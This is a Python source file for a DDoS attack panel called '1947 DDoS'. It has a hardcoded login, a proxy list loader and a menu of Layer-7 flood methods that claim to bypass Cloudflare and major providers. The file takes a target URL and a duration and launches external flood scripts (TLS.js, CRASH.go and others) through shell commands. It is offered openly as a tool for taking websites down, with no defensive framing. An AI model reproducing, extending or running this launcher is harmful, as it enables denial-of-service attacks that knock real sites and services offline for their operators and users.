import socket
import os
import requests
import random
import getpass
import time
import sys
from pystyle import Colors, Colorate


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
proxys = open('proxy.txt').readlines()
bots = len(proxys)
bots_str = str(bots)

def si():
    print(Colorate.Diagonal(Colors.red_to_white, "WELCOME TO 1947 DDoS | USER: ROOT | PLAN :: VVIP | Proxy: " + bots_str + " | HAPPY TO USE"))
    print("")
  
def layer7():
    clear()
    si()
    print(Colorate.Horizontal(Colors.red_to_white, ''' 
    
   ░▒▓█▓▒░  ░▒▓██████▓▒░  ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓████████▓▒░       ░▒▓███████▓▒░  ░▒▓███████▓▒░   ░▒▓██████▓▒░   ░▒▓███████▓▒░ 
░▒▓████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░       ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        
   ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░        ░▒▓█▓▒░       ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        
   ░▒▓█▓▒░  ░▒▓███████▓▒░ ░▒▓████████▓▒░       ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓██████▓▒░  
   ░▒▓█▓▒░        ░▒▓█▓▒░        ░▒▓█▓▒░       ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░        ░▒▓█▓▒░ 
   ░▒▓█▓▒░        ░▒▓█▓▒░        ░▒▓█▓▒░      ░▒▓█▓▒░         ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░        ░▒▓█▓▒░ 
   ░▒▓█▓▒░  ░▒▓██████▓▒░         ░▒▓█▓▒░      ░▒▓█▓▒░         ░▒▓███████▓▒░  ░▒▓███████▓▒░   ░▒▓██████▓▒░  ░▒▓███████▓▒░  
                                                                                                                          
        
                LIST LAYER7 METHODS
          
            
!TLS - POWERFUL TLS METHOD BYPASS AMAZON GOOGLE CF ISP
!BYPASS - BYPASS ANY ISP WITH HIGH RPS SEND
!HTTPS - SEND ATTACK WITH HTTPS-FLOOD
!RAPID - SEND HIGH RPS FOR HTTP DDOS 
!BLACK - FUCKING WEBSITE UNTIL DOWN
!CRASH - LOW QUALITY WEBSITE ATTACK


HOW TO USE
TLS https://example.com 120         TLS URL TIME
'''))

def menu():
    clear()
    print(Colorate.Diagonal(Colors.red_to_white
   , "WELCOME TO 1947 DDoS | USER: ROOT| PLAN :: VVIP | Proxy: " + bots_str + " | HAPPY TO USE"))
    print("")
    banner = '''
        ⠀⠀⠀⠀⠀⠀

   ░▒▓█▓▒░  ░▒▓██████▓▒░  ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓████████▓▒░       ░▒▓███████▓▒░  ░▒▓███████▓▒░   ░▒▓██████▓▒░   ░▒▓███████▓▒░ 
░▒▓████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░       ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        
   ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░        ░▒▓█▓▒░       ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        
   ░▒▓█▓▒░  ░▒▓███████▓▒░ ░▒▓████████▓▒░       ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓██████▓▒░  
   ░▒▓█▓▒░        ░▒▓█▓▒░        ░▒▓█▓▒░       ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░        ░▒▓█▓▒░ 
   ░▒▓█▓▒░        ░▒▓█▓▒░        ░▒▓█▓▒░      ░▒▓█▓▒░         ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░        ░▒▓█▓▒░ 
   ░▒▓█▓▒░  ░▒▓██████▓▒░         ░▒▓█▓▒░      ░▒▓█▓▒░         ░▒▓███████▓▒░  ░▒▓███████▓▒░   ░▒▓██████▓▒░  ░▒▓███████▓▒░  
                                                                                                                          

Type Layer7 To See Layer7 Methods⠀⠀⠀⠀⠀  
'''
    print(Colorate.Diagonal(Colors.red_to_white, banner))
def main():
    menu()
    while(True):
        cnc = input(Colorate.Diagonal(Colors.red_to_white, "root@1947 DDoSV2#~"))
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()

        elif "TLS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node TLS.js {host} {time} 100 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "RAPID" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node RAPID.js {host} {time} 100 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "BLACK" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node BLACK.js {host} {time} 100 10')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');             
                
        elif "CRASH" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'go run CRASH.go {host} 9999 get {time} nil')

            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "HTTPS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node HTTPS.js {host} {time} 100 10 proxy.tx')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "BYPASS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node BYPASS.js {host} {time} 100 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');

        elif "help" in cnc:
            print(Colorate.Horizontal(Colors.red_to_white, ''' 
LAYER7 - SEE ALL LAYER7 METHOD
HELP - FOR HELP
CLEAR - CLEAR TERMINAL
'''))
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = "1947"
    passwd = "19471947"
    username = input("</> Username: ")
    password = getpass.getpass(prompt='</> Password: ')
    if username != user or password != passwd:
        print("")
        print("Password/Username xd??")        
        sys.exit(1)
    elif username == user and password == passwd:
        print("WELCOME TO 1947 DDoS")
        time.sleep(0.3)
        main()
login()